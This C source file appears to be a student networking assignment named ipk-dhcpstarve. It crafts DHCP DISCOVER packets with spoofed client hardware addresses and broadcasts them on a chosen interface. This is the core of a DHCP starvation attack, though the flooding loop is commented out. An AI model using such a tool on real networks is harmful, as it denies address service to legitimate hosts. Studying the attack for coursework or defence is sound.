// IPK2 Patrik Sztefek xsztef02

#define _POSIX_C_SOURCE 2
#include <unistd.h> // getopt
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <signal.h>
#include <stdint.h>

#define IP "255.255.255.255"
#define USAGE "Usage: ./ipk-dhcpstarve -i <interface>"

#define SERVER_PORT 67
#define CLIENT_PORT 68
#define MAGIC_COOKIE	0x63825363

static volatile int running = 1;
void intHandler(int dummy) {
	running = 0;
}


// DHCP zprava
typedef struct dhcp{
	uint8_t op;
	uint8_t htype;
	uint8_t hlen;
	uint8_t hops;
	uint32_t xid;
	uint16_t secs;
	uint16_t flags;
	uint32_t ciaddr;
	uint32_t yiaddr;
	uint32_t siaddr;
	uint32_t giaddr;
	uint32_t chaddr[4];
	uint8_t sname[64];
	uint8_t file[128];
	uint32_t magic;
	uint8_t options[4];
	uint16_t end;
} dhcp_t;

int main( int argc, char **argv){
	int pflag = 0;
	char c_tmp;

	// arg parse
	if(argc != 3){
		fprintf(stderr, USAGE);
		return 1;
	}

	while(( c_tmp = getopt( argc, argv, "i:" )) != -1 ){
		switch ( c_tmp ){
			case 'i':
			pflag = 1;
			break;
			default:
			fprintf(stderr, USAGE);
			return 1;
			break;
		}
	}

	if(!pflag){
		fprintf(stderr, USAGE);
		return 1;
	}

	printf("interface: %s\n",argv[2]);
	signal(SIGINT, intHandler);


	struct sockaddr_in server_addr;
	int socket_id, len = sizeof(server_addr);

	// dhcp header
	dhcp_t dhcp;
	memset(&dhcp, 0, sizeof(dhcp_t));

	//vytvoreni soketu
	if ((socket_id=socket(AF_INET, SOCK_DGRAM, 0)) == -1){
		fprintf(stderr, "socket error\n");
		exit(1);
	}

	// nastaveni interface
	int er = setsockopt(socket_id, SOL_SOCKET, SO_BINDTODEVICE, argv[2], sizeof(argv[2]));
printf("Interface bind: %d, %d,%s.\n",er,strlen(argv[2]),argv[2] );


	int bcast = 1;
	setsockopt(socket_id, SOL_SOCKET, SO_BROADCAST, &bcast, sizeof(bcast));



	memset((char *) &server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(SERVER_PORT);

	if (inet_aton(IP , &server_addr.sin_addr) == 0){
		fprintf(stderr, "inet_aton error\n");
		exit(1);
	}


	//naplneni DHCP zpravy
	dhcp.op = 1;
	dhcp.htype = 1;
	dhcp.hlen = 6;
	dhcp.hops = 0;
	dhcp.magic = htonl(MAGIC_COOKIE);
	dhcp.options[0] = 53;
	dhcp.options[1] = 1;
	dhcp.options[2] = 1;
	dhcp.end = 255;

	uint32_t i = 1;

	// while(running){
		// odeslani
		dhcp.xid = htonl(i);
		dhcp.chaddr[0] = htonl(i);
		if (sendto(socket_id, &dhcp, sizeof(dhcp_t) , 0 , (struct sockaddr *) &server_addr, len) == -1){
			fprintf(stderr, "sending error\n");
			exit(1);
		}
		i++;
	// }

	close(socket_id);


	printf("\nClosing...\n");

	return 0;
}
